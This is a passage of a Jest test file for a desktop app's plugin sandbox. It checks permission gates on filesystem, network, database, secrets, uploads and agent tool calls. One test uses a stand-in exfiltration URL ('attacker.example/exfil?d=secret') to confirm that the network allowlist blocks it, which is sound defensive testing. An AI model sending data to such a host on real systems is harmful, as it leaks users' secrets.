      expect(typeof context.db.tableExists).toBe("function")
    })
  })

  describe("shortcuts api", () => {
    it("should have register methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.shortcuts.register).toBe("function")
      expect(typeof context.shortcuts.registerMany).toBe("function")
    })

    it("should have utility methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.shortcuts.isAvailable).toBe("function")
      expect(typeof context.shortcuts.getRegistered).toBe("function")
    })

    it("should track registered shortcuts", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(context.shortcuts.getRegistered()).toEqual([])
      expect(context.shortcuts.isAvailable("Ctrl+S")).toBe(true)
    })
  })

  describe("context menu api", () => {
    it("should have register methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.contextMenu.register).toBe("function")
      expect(typeof context.contextMenu.registerMany).toBe("function")
    })
  })

  describe("window api", () => {
    it("should have create method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.window.create).toBe("function")
    })

    it("should have getter methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.window.getMain).toBe("function")
      expect(typeof context.window.getAll).toBe("function")
    })

    it("should have focus method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.window.focus).toBe("function")
    })

    it("should return main window", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      const mainWindow = context.window.getMain()
      expect(mainWindow.id).toBe("main")
      expect(mainWindow.title).toBe("Cognia")
    })

    it("getSize queries the real host window instead of returning a placeholder", async () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      const mockInvoke = invoke as jest.MockedFunction<typeof invoke>
      mockInvoke.mockResolvedValueOnce({
        success: true,
        data: { width: 1280, height: 720 },
        requestId: "req-test",
        runtimeVersion: "2.0.0",
        compat: { sdkVersion: "2.0.0", minSupportedSdk: "2.0.0", compatible: true },
      })

      const size = await context.window.getMain().getSize()

      expect(size).toEqual({ width: 1280, height: 720 })
      expect(mockInvoke).toHaveBeenCalledWith(
        "plugin_api_invoke",
        expect.objectContaining({
          request: expect.objectContaining({
            api: "window:getSize",
            payload: { windowId: "main" },
          }),
        })
      )
    })
  })

  describe("secrets api", () => {
    it("should have store and get methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.secrets.store).toBe("function")
      expect(typeof context.secrets.get).toBe("function")
    })

    it("should have delete and has methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.secrets.delete).toBe("function")
      expect(typeof context.secrets.has).toBe("function")
    })

    const okEnvelope = (data: unknown) => ({
      success: true,
      data,
      requestId: "req-test",
      runtimeVersion: "2.0.0",
      compat: { sdkVersion: "2.0.0", minSupportedSdk: "2.0.0", compatible: true },
    })

    it("store() sends the secrets:set wire op so the host gateway accepts it", async () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      // secrets-api checks isTauri at call time; flip to the desktop gateway
      // path only for the call so context creation doesn't consume the mock.
      mockIsTauri.mockReturnValue(true)
      const mockInvoke = invoke as jest.MockedFunction<typeof invoke>
      mockInvoke.mockResolvedValue(okEnvelope(null))

      await context.secrets.store("api-key", "secret-value")

      expect(mockInvoke).toHaveBeenCalledWith(
        "plugin_api_invoke",
        expect.objectContaining({
          request: expect.objectContaining({
            api: "secrets:set",
            payload: { key: "api-key", value: "secret-value" },
          }),
        })
      )
    })

    it("has() reads via secrets:get and returns true/false on presence", async () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      mockIsTauri.mockReturnValue(true)
      const mockInvoke = invoke as jest.MockedFunction<typeof invoke>

      mockInvoke.mockResolvedValueOnce(okEnvelope("present"))
      expect(await context.secrets.has("known")).toBe(true)

      mockInvoke.mockResolvedValueOnce(okEnvelope(null))
      expect(await context.secrets.has("missing")).toBe(false)

      expect(mockInvoke).toHaveBeenLastCalledWith(
        "plugin_api_invoke",
        expect.objectContaining({
          request: expect.objectContaining({ api: "secrets:get", payload: { key: "missing" } }),
        })
      )
    })
  })

  describe("native ctx permission boundary", () => {
    const okEnvelope = (data: unknown) => ({
      success: true,
      data,
      requestId: "req-test",
      runtimeVersion: "2.0.0",
      compat: { sdkVersion: "2.0.0", minSupportedSdk: "2.0.0", compatible: true },
    })

    it("fs read fails closed when the plugin never declared filesystem:read", () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", []) // declares nothing
      const context = createPluginContext(createMockPlugin(), mockManager)

      // filesystem:read is silent-tier → the guard rejects synchronously.
      expect(() => context.fs.readText("notes.txt")).toThrow(PermissionError)
    })

    it("network egress is denied when the plugin never declared network:fetch", () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", [])
      const context = createPluginContext(createMockPlugin(), mockManager)

      // Undeclared → no confirm-tier row → the guard's synchronous fast-path
      // gate rejects the call before it can reach the network.
      expect(() => context.network.get("https://api.example.com/data")).toThrow(PermissionError)
    })

    it("db query fails closed without the database:read grant", () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", [])
      const context = createPluginContext(createMockPlugin(), mockManager)

      // database:read is silent-tier → the guard rejects synchronously.
      expect(() => context.db.query("SELECT 1")).toThrow(PermissionError)
    })

    it("db query reaches the gateway with the database:read grant", async () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", ["database:read"])
      mockIsTauri.mockReturnValue(true)
      const mockInvoke = invoke as jest.MockedFunction<typeof invoke>
      mockInvoke.mockResolvedValueOnce(okEnvelope([{ n: 1 }]))
      const context = createPluginContext(createMockPlugin(), mockManager)

      const rows = await context.db.query("SELECT 1 AS n")

      expect(mockInvoke).toHaveBeenCalledWith(
        "plugin_api_invoke",
        expect.objectContaining({
          request: expect.objectContaining({ api: "db:query" }),
        })
      )
      expect(rows).toEqual([{ n: 1 }])
    })

    it("network egress persists a host ledger grant after consent on desktop", async () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", ["network:fetch"])
      mockIsTauri.mockReturnValue(true)
      const mockInvoke = invoke as jest.MockedFunction<typeof invoke>
      mockInvoke.mockResolvedValue(okEnvelope({ ok: true, status: 200, data: {} }))
      // Declare an allowlist covering the target host — undeclared egress is
      // now denied fail-closed before the consent path could even fire.
      const context = createPluginContext(
        createMockPlugin({
          manifest: { ...mockManifest, networkAccess: { allowedDomains: ["example.com"] } },
        }),
        mockManager
      )

      await context.network.get("https://api.example.com/data")

      // network:fetch is now confirm-tier → the consent path fires the
      // onConsentGranted hook, which mirrors the grant to the Rust ledger so the
      // gateway call that follows isn't denied by the independent host gate.
      expect(mockInvoke).toHaveBeenCalledWith(
        "plugin_permission_grant",
        expect.objectContaining({ pluginId: "test-plugin", permission: "network:fetch" })
      )
    })

    it("passes an explicit upload file-content policy to the native gateway", async () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", ["network:upload"])
      mockIsTauri.mockReturnValue(true)
      const mockInvoke = invoke as jest.MockedFunction<typeof invoke>
      mockInvoke.mockResolvedValue(okEnvelope({ ok: true, status: 200, data: {} }))
      const context = createPluginContext(
        createMockPlugin({
          manifest: { ...mockManifest, networkAccess: { allowedDomains: ["example.com"] } },
        }),
        mockManager
      )

      await context.network.upload("https://files.example.com/upload", "report.txt", {
        fileContentPolicy: "allow",
        dataClassification: "internal",
      })

      expect(mockInvoke).toHaveBeenCalledWith(
        "plugin_api_invoke",
        expect.objectContaining({
          request: expect.objectContaining({
            api: "network:upload",
            payload: expect.objectContaining({
              fileContentPolicy: "allow",
              dataClassification: "internal",
            }),
          }),
        })
      )
    })

    it("rejects an allowed upload without an explicit data classification", async () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", ["network:upload"])
      mockIsTauri.mockReturnValue(true)
      const context = createPluginContext(
        createMockPlugin({
          manifest: { ...mockManifest, networkAccess: { allowedDomains: ["example.com"] } },
        }),
        mockManager
      )

      await expect(
        context.network.upload("https://files.example.com/upload", "report.txt", {
          fileContentPolicy: "allow",
        })
      ).rejects.toThrow(/requires dataClassification/)
    })

    it("blocks upload file content by default before invoking the native gateway", async () => {
      resetPermissionGuard()
      getPermissionGuard().registerPlugin("test-plugin", ["network:upload"])
      mockIsTauri.mockReturnValue(true)
      const mockInvoke = invoke as jest.MockedFunction<typeof invoke>
      const context = createPluginContext(
        createMockPlugin({
          manifest: { ...mockManifest, networkAccess: { allowedDomains: ["example.com"] } },
        }),
        mockManager
      )

      await expect(
        context.network.upload("https://files.example.com/upload", "report.txt")
      ).rejects.toThrow(/file content is blocked/)
      expect(mockInvoke).not.toHaveBeenCalledWith("plugin_api_invoke", expect.anything())
    })
  })

  describe("browser runtime adapters", () => {
    it("uses browser clipboard APIs when tauri is unavailable", async () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      const invokeMock = invoke as jest.Mock

      await expect(context.clipboard.readText()).resolves.toBe("browser clipboard")

      expect(navigator.clipboard.readText).toHaveBeenCalled()
      expect(invokeMock).not.toHaveBeenCalledWith("plugin_api_invoke", expect.anything())
    })

    it("rejects filesystem reads with NOT_SUPPORTED in browser runtime", async () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      await expect(context.fs.readText("/workspace/file.txt")).rejects.toThrow(
        /requires the Cognia desktop app/i
      )
    })
  })
})

describe("createFullPluginContext", () => {
  it("wires link registration to live permission grants and its lifecycle scope", async () => {
    clearAllLinkMatchers()
    const scope = new PluginDisposableScope("test-plugin")
    const manager = {
      ...mockManager,
      getPluginDisposableScope: () => scope,
    } as unknown as PluginManager
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, manager)
    const definition = { id: "links", patterns: ["github.com/**"], component: () => null }
    expect(() => context.chat.registerLinkMatcher(definition)).toThrow(/extension:ui/)
    initializePluginPermissions(plugin.manifest.id, ["extension:ui"])
    context.chat.registerLinkMatcher(definition)
    expect(getLinkMatcher("https://github.com/foo")?.pluginId).toBe(plugin.manifest.id)
    revokePluginPermissions(plugin.manifest.id)
    expect(() => context.chat.registerLinkMatcher({ ...definition, id: "new" })).toThrow(
      /extension:ui/
    )
    await scope.dispose()
    expect(getLinkMatcher("https://github.com/foo")).toBeUndefined()
    clearAllLinkMatchers()
  })

  it("should create context with base APIs", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(context.pluginId).toBe("test-plugin")
    expect(context.logger).toBeDefined()
    expect(context.storage).toBeDefined()
  })

  it("should create context with feature APIs", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(context.session).toBeDefined()
    expect(context.project).toBeDefined()
    expect(context.vector).toBeDefined()
    expect(context.theme).toBeDefined()
    expect(context.export).toBeDefined()
    expect(context.i18n).toBeDefined()
    expect(context.canvas).toBeDefined()
    expect(context.artifact).toBeDefined()
    expect(context.media).toBeDefined()
    expect(context.notifications).toBeDefined()
    expect(context.ai).toBeDefined()
    expect(context.extensions).toBeDefined()
    expect(context.permissions).toBeDefined()
    expect(context.contextPanels).toBeDefined()
    expect(context.memory).toBeDefined()
    expect(context.pet).toBeDefined()
    expect(context.webview).toBeDefined()
    expect(context.auth).toBeDefined()
    expect(context.uri).toBeDefined()
    expect(context.lifecycle.signal).toBeInstanceOf(AbortSignal)
  })

  it("aborts the generation before running ctx.lifecycle cleanup", async () => {
    const scope = new PluginDisposableScope("test-plugin", 9)
    const observations: boolean[] = []
    const manager = {
      getPluginPointGovernanceMode: jest.fn(() => "warn"),
      getPluginDisposableScope: jest.fn(() => scope),
      createPluginServicesAPI: mockManager.createPluginServicesAPI,
    } as unknown as PluginManager
    const context = createFullPluginContext(createMockPlugin(), manager)
    context.lifecycle.onDispose(() => {
      observations.push(context.lifecycle.signal.aborted)
    })

    await scope.dispose()

    expect(context.lifecycle.signal.aborted).toBe(true)
    expect(observations).toEqual([true])
  })

  it("enrolls registration disposers in the manager lifecycle scope", async () => {
    const scope = new PluginDisposableScope("test-plugin")
    const audit = jest.fn()
    const unsubscribeAudit = subscribePluginApiAudit(audit)
    const manager = {
      getPluginPointGovernanceMode: jest.fn(() => "warn"),
      getPluginDisposableScope: jest.fn(() => scope),
      createPluginServicesAPI: mockManager.createPluginServicesAPI,
    } as unknown as PluginManager
    const context = createFullPluginContext(createMockPlugin(), manager)

    context.events.on("test-event", () => undefined)

    await expect(scope.dispose()).resolves.toEqual({ disposed: 2, failures: [] })
    expect(audit).toHaveBeenCalledTimes(1)
    expect(audit).toHaveBeenCalledWith(
      expect.objectContaining({ methodId: "events.on", outcome: "allowed" })
    )
    unsubscribeAudit()
  })

  it("keeps the legacy cleanup path available when ledger v2 is explicitly disabled", async () => {
    const scope = new PluginDisposableScope("test-plugin")
    const manager = {
      getPluginPointGovernanceMode: jest.fn(() => "warn"),
      getPluginDisposableScope: jest.fn(() => scope),
      createPluginServicesAPI: mockManager.createPluginServicesAPI,
      isPluginLedgerV2Enabled: jest.fn(() => false),
    } as unknown as PluginManager
    const context = createFullPluginContext(createMockPlugin(), manager)
    const off = context.events.on("test-event", () => undefined)

    const report = await scope.dispose()

    expect(typeof off).toBe("function")
    expect(report).toEqual({ disposed: 1, failures: [] })
    expect(scope.getDiagnostics()).toMatchObject({ active: 0, pending: 0, failed: 0 })
  })

  it("stamps and removes runtime tools through the plugin lifecycle scope", async () => {
    const scope = new PluginDisposableScope("test-plugin")
    const registry = new PluginRegistry()
    const manager = {
      getPluginPointGovernanceMode: jest.fn(() => "warn"),
      getPluginDisposableScope: jest.fn(() => scope),
      getRegistry: jest.fn(() => registry),
      createPluginServicesAPI: mockManager.createPluginServicesAPI,
    } as unknown as PluginManager
    const context = createFullPluginContext(createMockPlugin(), manager)

    context.agent.registerTool({
      name: "office_test",
      pluginId: "spoofed-owner",
      definition: { name: "office_test", description: "test", parametersSchema: {} },
      execute: jest.fn(),
    })

    expect(registry.getTool("office_test")?.pluginId).toBe("test-plugin")
    const report = await scope.dispose()
    expect(report.failures).toEqual([])
    expect(registry.getTool("office_test")).toBeUndefined()
  })

  it("does not let a plugin unregister a dependency-owned tool", () => {
    const registry = new PluginRegistry()
    registry.registerTool("dependency", {
      name: "dependency_tool",
      pluginId: "dependency",
      definition: { name: "dependency_tool", description: "test", parametersSchema: {} },
      execute: jest.fn(),
    })
    const context = createFullPluginContext(createMockPlugin(), {
      getPluginPointGovernanceMode: jest.fn(() => "warn"),
      getRegistry: jest.fn(() => registry),
      createPluginServicesAPI: mockManager.createPluginServicesAPI,
    } as unknown as PluginManager)

    expect(() => context.agent.unregisterTool("dependency_tool")).toThrow("does not own")
    expect(registry.getTool("dependency_tool")?.pluginId).toBe("dependency")
  })

  it("should have session API methods", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(typeof context.session.getCurrentSession).toBe("function")
    expect(typeof context.session.createSession).toBe("function")
    expect(typeof context.session.listSessions).toBe("function")
  })

  it("should have project API methods", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(typeof context.project.getCurrentProject).toBe("function")
    expect(typeof context.project.createProject).toBe("function")
    expect(typeof context.project.listProjects).toBe("function")
  })

  it("should have vector API methods", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(typeof context.vector.search).toBe("function")
    expect(typeof context.vector.addDocuments).toBe("function")
  })

  it("should have notifications API methods", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(typeof context.notifications.create).toBe("function")
    expect(typeof context.notifications.dismiss).toBe("function")
  })

  it("should have permissions API methods", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(typeof context.permissions.hasPermission).toBe("function")
  })

  it("should expose resource-scoped context panel registration", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(typeof context.contextPanels.register).toBe("function")
  })

  it("agent.registerExternalAgentAdapter registers a namespaced adapter into the registry", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)
    expect(typeof context.agent.registerExternalAgentAdapter).toBe("function")
    // The registry only stores the factory; a no-op factory is enough to prove
    // namespaced registration + per-plugin cleanup.
    context.agent.registerExternalAgentAdapter("demo", (() => ({})) as never)
    expect(protocolAdapterRegistry.has("test-plugin:demo")).toBe(true)
    expect(unregisterPluginProtocolAdaptersByPlugin("test-plugin")).toBe(1)
    expect(protocolAdapterRegistry.has("test-plugin:demo")).toBe(false)
    __resetPluginProtocolAdaptersForTesting()
  })
})

describe("isFullPluginContext", () => {
  it("should return true for full context", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)

    expect(isFullPluginContext(context)).toBe(true)
  })

  it("should return false for base context", () => {
    const plugin = createMockPlugin()
    const context = createPluginContext(plugin, mockManager)

    expect(isFullPluginContext(context)).toBe(false)
  })
})

describe("agent imperative API", () => {
  const mockExecuteAgent = executeAgent as jest.MockedFunction<typeof executeAgent>
  const mockGetExternalManager = getExternalAgentManager as jest.MockedFunction<
    typeof getExternalAgentManager
  >
  const mockCreateAgentFromPreset = createAgentFromPreset as jest.MockedFunction<
    typeof createAgentFromPreset
  >

  const PLUGIN_ID = "test-plugin"

  beforeEach(() => {
    jest.clearAllMocks()
    revokePluginPermissions(PLUGIN_ID)
    __resetBackgroundAgentManagerForTesting()
    mockExecuteAgent.mockResolvedValue({
      text: "agent reply",
      channel: "text",
      toolsAvailable: false,
    })
  })

  describe("executeAgent", () => {
    it("returns the run result with a generated agentId", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = (await ctx.agent.executeAgent({ prompt: "hi" })) as {
        text: string
        agentId: string
      }
      expect(result.text).toBe("agent reply")
      expect(typeof result.agentId).toBe("string")
      expect(result.agentId.length).toBeGreaterThan(0)
      // The caller signal is threaded through to the executor.
      expect(mockExecuteAgent).toHaveBeenCalledWith(
        "hi",
        expect.objectContaining({ abortSignal: expect.any(AbortSignal) })
      )
    })

    it("uses a caller-supplied agentId and de-registers it after completion", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = (await ctx.agent.executeAgent({ prompt: "hi", agentId: "run-1" })) as {
        agentId: string
      }
      expect(result.agentId).toBe("run-1")
      // finishAgent dropped the entry → nothing left to cancel.
      expect(getBackgroundAgentManager().cancelAgent("run-1")).toBe(false)
    })

    it("throws on empty prompt", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(ctx.agent.executeAgent({})).rejects.toThrow(/requires config.prompt/)
    })

    it("rejects tool-enabled runs without the agent:control permission", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(ctx.agent.executeAgent({ prompt: "hi", toolsEnabled: true })).rejects.toThrow(
        /agent:control/
      )
      expect(mockExecuteAgent).not.toHaveBeenCalled()
    })

    it("allows tool-enabled runs once agent:control is granted", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      mockExecuteAgent.mockResolvedValue({
        text: "tool reply",
        channel: "sidecar",
        toolsAvailable: true,
      })
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = (await ctx.agent.executeAgent({ prompt: "go", toolsEnabled: true })) as {
        channel: string
      }
      expect(result.channel).toBe("sidecar")
      expect(mockExecuteAgent).toHaveBeenCalledWith(
        "go",
        expect.objectContaining({ toolsEnabled: true })
      )
    })

    it("maps legacy systemPrompt/defaultProvider onto the typed run options", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await ctx.agent.executeAgent({ prompt: "hi", systemPrompt: "S", defaultProvider: "openai" })
      expect(mockExecuteAgent).toHaveBeenCalledWith(
        "hi",
        expect.objectContaining({ systemPrompt: "S", defaultProvider: "openai" })
      )
    })
  })

  describe("run / runStreamed", () => {
    it("run() returns a typed result with an agentId", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = await ctx.agent.run("hi")
      expect(result.text).toBe("agent reply")
      expect(typeof result.agentId).toBe("string")
    })

    it("run() rejects tool-enabled runs without agent:control", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(ctx.agent.run("hi", { toolsEnabled: true })).rejects.toThrow(/agent:control/)
      expect(mockExecuteAgent).not.toHaveBeenCalled()
    })

    it("runStreamed() yields events and resolves the result", async () => {
      mockExecuteAgent.mockImplementation(async (_p, cfg) => {
        cfg?.onEvent?.({ type: "text-delta", delta: "hi" })
        return { text: "hi", channel: "text", toolsAvailable: false }
      })
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const run = ctx.agent.runStreamed("go")
      const types: string[] = []
      for await (const ev of run) types.push(ev.type)
      expect(types).toEqual(["text-delta", "result"])
      await expect(run.result).resolves.toMatchObject({ text: "hi" })
    })

    it("runStreamed() throws synchronously when tool-enabled lacks agent:control", () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      expect(() => ctx.agent.runStreamed("go", { toolsEnabled: true })).toThrow(/agent:control/)
    })
  })

  describe("invokeTool", () => {
    const mockInvokePluginTool = invokePluginTool as jest.MockedFunction<typeof invokePluginTool>

    afterEach(() => {
      __resetPluginHostRuntimesForTesting()
    })

    it("rejects without the agent:control permission", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(ctx.agent.invokeTool("own_tool", { url: "x" })).rejects.toThrow(/agent:control/)
      expect(mockInvokePluginTool).not.toHaveBeenCalled()
    })

    it("routes to invokePluginTool and unwraps the result once granted", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = await ctx.agent.invokeTool("own_tool", { url: "x" })
      expect(mockInvokePluginTool).toHaveBeenCalledWith(
        PLUGIN_ID,
        "own_tool",
        { url: "x" },
        expect.objectContaining({ reason: expect.stringContaining("own_tool") })
      )
      expect(result).toEqual({ ok: true, toolName: "own_tool" })
    })

    it("forwards the caller's session and message ids to the plugin's own tool", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await ctx.agent.invokeTool("own_tool", {}, { sessionId: "s1", messageId: "m1" })
      expect(mockInvokePluginTool).toHaveBeenCalledWith(
        PLUGIN_ID,
        "own_tool",
        {},
        expect.objectContaining({ sessionId: "s1", messageId: "m1" })
      )
    })

    it("routes an author-callable host tool to the host runtime, not the plugin registry", async () => {
      // The promoted web tools must reach the HOST's search/fetch policy. If
      // they fell through to `invokePluginTool` a plugin could shadow them by
      // registering the same name — and the host's cache, source verification,
      // SSRF guard and rate limiter would be bypassed.
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const runHostTool = jest.fn(async () => ({ ok: true, results: [] }))
      setAmbientHostRuntime(() => ({
        runHostTool,
        chat: async function* () {},
        embed: async () => [],
        getDefaultProvider: () => "openai",
        getDefaultModel: () => "gpt-4o",
      }))
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = await ctx.agent.invokeTool("web_search", { query: "cognia" })
      expect(runHostTool).toHaveBeenCalledWith("web_search", { query: "cognia" }, {})
      expect(mockInvokePluginTool).not.toHaveBeenCalled()
      expect(result).toEqual({ ok: true, results: [] })
    })

    it("resolves the host runtime for the session the caller named", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const seen: Array<string | undefined> = []
      setAmbientHostRuntime((request) => {
        seen.push(request.sessionId)
        return {
          runHostTool: async () => ({ ok: true }),
          chat: async function* () {},
          embed: async () => [],
          getDefaultProvider: () => "openai",
          getDefaultModel: () => "gpt-4o",
        }
      })
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await ctx.agent.invokeTool("web_fetch", { url: "https://x" }, { sessionId: "s-42" })
      expect(seen).toEqual(["s-42"])
    })

    it("clamps a promoted web_fetch to the manifest's networkAccess allowlist", async () => {
      // Running host-side reuses the host's SSRF guard, which does not know the
      // plugin. Without this clamp `agent:control` alone bought a plugin
      // unrestricted egress through a door `ctx.network` keeps shut.
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const runHostTool = jest.fn(async () => ({ ok: true }))
      setAmbientHostRuntime(() => ({
        runHostTool,
        chat: async function* () {},
        embed: async () => [],
        getDefaultProvider: () => "openai",
        getDefaultModel: () => "gpt-4o",
      }))
      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
        createMockPlugin({
          manifest: {
            ...mockManifest,
            networkAccess: { allowedDomains: ["api.allowed.test"] },
          },
        })
      )
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = await ctx.agent.invokeTool("web_fetch", {
        url: "https://attacker.example/exfil?d=secret",
      })
      expect(runHostTool).not.toHaveBeenCalled()
      expect(result).toMatchObject({ ok: false, code: "blocked" })
    })

    it("gates web_clone on network + filesystem write, not agent:control, and clamps its target", async () => {
      const runHostTool = jest.fn(async () => ({ ok: true, envelope: { ok: true } }))
      setAmbientHostRuntime(() => ({
        runHostTool,
        chat: async function* () {},
        embed: async () => [],
        getDefaultProvider: () => "openai",
        getDefaultModel: () => "gpt-4o",
      }))
      const job = { mode: "snapshot", url: "https://docs.allowed.test/", options: { output: "/o" } }

      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const withoutGrants = createPluginContext(createMockPlugin(), mockManager)
      await expect(withoutGrants.agent.invokeTool("web_clone", { job } as never)).rejects.toThrow(
        /requires the "filesystem:write" permission/
      )

      initializePluginPermissions(PLUGIN_ID, ["network:fetch", "filesystem:write"])
      ;(mockManager.getPlugin as jest.Mock).mockImplementation(() =>
        createMockPlugin({
          manifest: {
            ...mockManifest,
            permissions: ["network:fetch", "filesystem:write"],
            networkAccess: { allowedDomains: ["docs.allowed.test"] },
          },
        })
      )
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(
        ctx.agent.invokeTool("web_clone", {
          job: { ...job, url: "https://elsewhere.example/" },
        } as never)
      ).resolves.toMatchObject({ ok: false, code: "blocked" })
      expect(runHostTool).not.toHaveBeenCalled()

      await ctx.agent.invokeTool("web_clone", { job } as never)
      expect(runHostTool).toHaveBeenCalledWith("web_clone", { job }, {})
      ;(mockManager.getPlugin as jest.Mock).mockImplementation(() => createMockPlugin())
    })

    it("allows a promoted web_fetch to a host the manifest declared", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const runHostTool = jest.fn(async () => ({ ok: true, status: 200 }))
      setAmbientHostRuntime(() => ({
        runHostTool,
        chat: async function* () {},
        embed: async () => [],
        getDefaultProvider: () => "openai",
        getDefaultModel: () => "gpt-4o",
      }))
      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
        createMockPlugin({
          manifest: {
            ...mockManifest,
            networkAccess: { allowedDomains: ["api.allowed.test"] },
          },
        })
      )
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await ctx.agent.invokeTool("web_fetch", { url: "https://api.allowed.test/v1/thing" })
      expect(runHostTool).toHaveBeenCalledWith(
        "web_fetch",
        { url: "https://api.allowed.test/v1/thing" },
        {}
      )
    })

    it("leaves the SSRF target policy to the executor that knows allowPrivateHosts", async () => {
      // The clamp answers ONE question: is this host inside the manifest's
      // allowlist. Deciding the private-host question here too re-decided it
      // with the default policy, so a user who turned on Settings → Search →
      // "allow private hosts" still got a refusal — reported as the plugin's
      // own `["*"]` denying it.
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const runHostTool = jest.fn(async () => ({ ok: true, status: 200 }))
      setAmbientHostRuntime(() => ({
        runHostTool,
        chat: async function* () {},
        embed: async () => [],
        getDefaultProvider: () => "openai",
        getDefaultModel: () => "gpt-4o",
      }))
      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
        createMockPlugin({
          manifest: { ...mockManifest, networkAccess: { allowedDomains: ["*"] } },
        })
      )
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = await ctx.agent.invokeTool("web_fetch", { url: "http://192.168.1.10/api" })
      expect(result).not.toMatchObject({ code: "blocked" })
      expect(runHostTool).toHaveBeenCalledWith("web_fetch", { url: "http://192.168.1.10/api" }, {})
    })

    it("refuses a promoted web_fetch when the manifest declares no networkAccess", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const runHostTool = jest.fn(async () => ({ ok: true }))
      setAmbientHostRuntime(() => ({
        runHostTool,
        chat: async function* () {},
        embed: async () => [],
        getDefaultProvider: () => "openai",
        getDefaultModel: () => "gpt-4o",
      }))
      ;(mockManager.getPlugin as jest.Mock).mockReturnValueOnce(
        createMockPlugin({ manifest: { ...mockManifest, networkAccess: undefined } })
      )
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = await ctx.agent.invokeTool("web_fetch", { url: "https://api.allowed.test/x" })
      expect(runHostTool).not.toHaveBeenCalled()
      expect(result).toMatchObject({ ok: false, code: "blocked" })
    })

    it("rejects an empty tool name", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:control"])
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(ctx.agent.invokeTool("", {})).rejects.toThrow(/tool name/)
    })
  })

  describe("runExternalAgent", () => {
    it("rejects without the agent:dispatch-external permission", async () => {
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(ctx.agent.runExternalAgent("codex", "do it")).rejects.toThrow(
        /agent:dispatch-external/
      )
    })

    it("adds an instance from a preset then executes it", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:dispatch-external"])
      const execute = jest.fn(async () => ({
        success: true,
